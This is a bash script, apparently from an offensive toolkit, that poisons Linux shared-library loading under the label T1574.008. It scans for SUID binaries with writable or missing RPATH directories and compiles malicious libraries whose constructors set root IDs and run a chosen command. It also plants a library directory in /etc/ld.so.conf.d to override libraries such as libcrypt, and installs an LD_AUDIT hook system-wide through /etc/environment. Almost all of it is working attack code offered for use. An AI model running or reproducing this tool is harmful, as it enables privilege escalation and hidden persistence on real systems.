#!/bin/bash
# T1574.008 — Hijack Execution Flow: RPATH/ldconfig/LD_AUDIT Library Poisoning
# Three distinct shared library hijack vectors beyond ld.so.preload

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

MARKER="d3m0n_ldpoison"
POISON_DIR="/usr/lib/.d3m0n_ldpoison"

banner_ldp() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║   T1574.008 — Library RPATH/ldconfig Poisoning║"
    echo "  ║   RPATH exploit, ldconfig cache, LD_AUDIT     ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

rpath_exploit() {
    echo -e "${CYAN}[*] RPATH Exploitation — find and exploit vulnerable binaries${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    if ! command -v readelf &>/dev/null; then
        echo -e "${RED}[!] readelf not found. Install: apt install binutils${NC}"
        return
    fi

    echo -e "${CYAN}[*] Scanning for SUID/SGID binaries with RPATH/RUNPATH...${NC}"

    local found=0
    find / -perm -4000 -o -perm -2000 2>/dev/null | while IFS= read -r bin; do
        [[ -f "$bin" ]] || continue
        local rpath
        rpath=$(readelf -d "$bin" 2>/dev/null | grep -E "RPATH|RUNPATH" | awk -F'[][]' '{print $2}')
        [[ -z "$rpath" ]] && continue

        local needed
        needed=$(readelf -d "$bin" 2>/dev/null | grep "NEEDED" | awk -F'[][]' '{print $2}')

        echo -e "  ${RED}[!] ${bin}${NC}"
        echo -e "    RPATH: ${rpath}"
        echo -e "    NEEDED: ${needed}"

        # Check if RPATH directory is writable or doesn't exist (can be created)
        for rdir in $(echo "$rpath" | tr ':' ' '); do
            if [[ ! -d "$rdir" ]]; then
                echo -e "    ${GREEN}→ RPATH dir ${rdir} doesn't exist — can be created!${NC}"
            elif [[ -w "$rdir" ]]; then
                echo -e "    ${GREEN}→ RPATH dir ${rdir} is writable!${NC}"
            fi
        done
        found=$((found + 1))
    done

    if [[ $found -eq 0 ]]; then
        echo -e "${YELLOW}[!] No SUID binaries with exploitable RPATH found${NC}"
        return
    fi

    echo ""
    read -p "  Exploit a binary? Enter path (or skip): " TBIN
    [[ -z "$TBIN" || ! -f "$TBIN" ]] && return

    local RPATH
    RPATH=$(readelf -d "$TBIN" 2>/dev/null | grep -E "RPATH|RUNPATH" | awk -F'[][]' '{print $2}' | cut -d: -f1)
    local NEEDED
    NEEDED=$(readelf -d "$TBIN" 2>/dev/null | grep "NEEDED" | awk -F'[][]' '{print $2}' | head -1)

    echo -e "${CYAN}[*] Creating malicious ${NEEDED} in ${RPATH}${NC}"

    read -p "  Payload command: " CMD

    mkdir -p "$RPATH" 2>/dev/null
    mkdir -p "$POISON_DIR" 2>/dev/null

    # Create malicious shared library
    cat > "${POISON_DIR}/rpath_poison.c" << CEOF
/* ${MARKER} */
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init() {
    if (getuid() != geteuid()) {
        setuid(0);
        setgid(0);
        system("${CMD}");
    }
}
CEOF

    gcc -shared -fPIC -o "${RPATH}/${NEEDED}" "${POISON_DIR}/rpath_poison.c" 2>/dev/null

    if [[ $? -eq 0 ]]; then
        echo -e "${GREEN}[+] Poisoned library: ${RPATH}/${NEEDED}${NC}"
        echo -e "${YELLOW}[*] Trigger: run ${TBIN} as unprivileged user${NC}"
    else
        echo -e "${RED}[!] Compilation failed${NC}"
    fi
}

ldconfig_poison() {
    echo -e "${CYAN}[*] ldconfig cache poisoning${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    if ! command -v gcc &>/dev/null; then
        echo -e "${RED}[!] gcc required${NC}"
        return
    fi

    echo -e "  ${CYAN}[1]${NC} Inject directory into /etc/ld.so.conf.d/"
    echo -e "  ${CYAN}[2]${NC} Override specific library (e.g. libcrypt, libpam)"
    read -p "  Method [1]: " method
    method="${method:-1}"

    mkdir -p "$POISON_DIR" 2>/dev/null

    case "$method" in
        1)
            # Create a new config in ld.so.conf.d pointing to our directory
            local LIBDIR="${POISON_DIR}/libs"
            mkdir -p "$LIBDIR" 2>/dev/null

            cat > /etc/ld.so.conf.d/d3m0n-libs.conf << CEOF
# ${MARKER}
${LIBDIR}
CEOF

            read -p "  Payload command: " CMD

            # Create a shared library with constructor
            cat > "${POISON_DIR}/inject.c" << CEOF
/* ${MARKER} */
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
static int done = 0;
__attribute__((constructor)) void init() {
    if (!done && getuid() == 0) {
        done = 1;
        system("${CMD}");
    }
}
CEOF
            gcc -shared -fPIC -o "${LIBDIR}/libsystem_helper.so" "${POISON_DIR}/inject.c" 2>/dev/null

            # Run ldconfig to update cache
            ldconfig 2>/dev/null

            echo -e "${GREEN}[+] Library directory injected: ${LIBDIR}${NC}"
            echo -e "${GREEN}[+] ldconfig cache updated${NC}"
            echo -e "${YELLOW}[*] Any binary linking libsystem_helper.so will trigger payload${NC}"
            ;;
        2)
            read -p "  Library to override (e.g. libcrypt.so.1): " LIBNAME
            [[ -z "$LIBNAME" ]] && return

            read -p "  Payload command: " CMD

            local LIBDIR="${POISON_DIR}/libs"
            mkdir -p "$LIBDIR" 2>/dev/null

            # Find the real library
            local REAL_LIB
            REAL_LIB=$(ldconfig -p 2>/dev/null | grep "$LIBNAME" | awk '{print $NF}' | head -1)

            if [[ -z "$REAL_LIB" ]]; then
                echo -e "${RED}[!] Library not found in ldconfig cache${NC}"
                return
            fi

            echo -e "${YELLOW}[*] Real library: ${REAL_LIB}${NC}"

            # Create wrapper that loads real lib and adds our constructor
            cat > "${POISON_DIR}/wrap.c" << CEOF
/* ${MARKER} */
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
static int done = 0;
__attribute__((constructor)) void init() {
    if (!done) {
        done = 1;
        if (getuid() == 0) system("${CMD}");
    }
}
CEOF
            gcc -shared -fPIC -o "${LIBDIR}/${LIBNAME}" "${POISON_DIR}/wrap.c" 2>/dev/null

            if [[ ! -f /etc/ld.so.conf.d/d3m0n-libs.conf ]]; then
                cat > /etc/ld.so.conf.d/d3m0n-libs.conf << CEOF
# ${MARKER}
${LIBDIR}
CEOF
            fi

            ldconfig 2>/dev/null

            echo -e "${GREEN}[+] ${LIBNAME} overridden in ${LIBDIR}${NC}"
            echo -e "${YELLOW}[*] Our directory takes priority in ldconfig cache${NC}"
            ;;
    esac
}

ld_audit_hook() {
    echo -e "${CYAN}[*] LD_AUDIT hooking (audit interface)${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    if ! command -v gcc &>/dev/null; then
        echo -e "${RED}[!] gcc required${NC}"
        return
    fi

    mkdir -p "$POISON_DIR" 2>/dev/null

    read -p "  Payload command: " CMD

    # LD_AUDIT allows intercepting dynamic linking events
    cat > "${POISON_DIR}/audit.c" << 'CEOF'
/* d3m0n_ldpoison - LD_AUDIT hook */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <link.h>
#include <unistd.h>

static int fired = 0;

unsigned int la_version(unsigned int version) {
    return version;
}

unsigned int la_objopen(struct link_map *map, Lmid_t lmid, uintptr_t *cookie) {
    if (!fired) {
        fired = 1;
CEOF

    echo "        system(\"${CMD}\");" >> "${POISON_DIR}/audit.c"

    cat >> "${POISON_DIR}/audit.c" << 'CEOF'
    }
    return LA_FLG_BINDTO | LA_FLG_BINDFROM;
}
CEOF

    gcc -shared -fPIC -o "${POISON_DIR}/libaudit_helper.so" "${POISON_DIR}/audit.c" -ldl 2>/dev/null

    if [[ $? -ne 0 ]]; then
        echo -e "${RED}[!] Compilation failed${NC}"
        return
    fi

    echo -e "${GREEN}[+] Audit library: ${POISON_DIR}/libaudit_helper.so${NC}"
    echo ""
    echo -e "${YELLOW}[*] Usage options:${NC}"
    echo -e "  1. Per-command: LD_AUDIT=${POISON_DIR}/libaudit_helper.so <command>"
    echo -e "  2. System-wide: Add to /etc/environment"
    echo ""

    read -p "  Install system-wide in /etc/environment? [y/N]: " yn
    if [[ "$yn" =~ ^[Yy] ]]; then
        cp /etc/environment /etc/environment.d3m0n_bak 2>/dev/null
        echo "LD_AUDIT=${POISON_DIR}/libaudit_helper.so" >> /etc/environment
        echo -e "${GREEN}[+] LD_AUDIT installed system-wide${NC}"
        echo -e "${RED}[!] WARNING: This will trigger on EVERY process start${NC}"
    fi
}

ldp_cleanup() {
    echo -e "${CYAN}[*] Cleaning up library poisoning...${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    # Remove ldconfig injection
    rm -f /etc/ld.so.conf.d/d3m0n-libs.conf 2>/dev/null

    # Remove LD_AUDIT from environment
    if [[ -f /etc/environment.d3m0n_bak ]]; then
        cp /etc/environment.d3m0n_bak /etc/environment
        rm -f /etc/environment.d3m0n_bak
    else
        sed -i '/LD_AUDIT.*d3m0n/d' /etc/environment 2>/dev/null
    fi

    # Remove poison directory
    rm -rf "$POISON_DIR"

    # Rebuild ldconfig cache
    ldconfig 2>/dev/null

    echo -e "${GREEN}[+] Library poisoning cleaned up${NC}"
}

main() {
    banner_ldp

    echo -e "  ${CYAN}[1]${NC} RPATH exploitation (find & exploit SUID binaries)"
    echo -e "  ${CYAN}[2]${NC} ldconfig cache poisoning (/etc/ld.so.conf.d/)"
    echo -e "  ${CYAN}[3]${NC} LD_AUDIT hooking (dynamic linker audit)"
    echo -e "  ${CYAN}[4]${NC} Cleanup"
    echo ""
    read -p "Choose [1-4]: " OPT

    case "$OPT" in
        1) rpath_exploit ;;
        2) ldconfig_poison ;;
        3) ld_audit_hook ;;
        4) ldp_cleanup ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

main
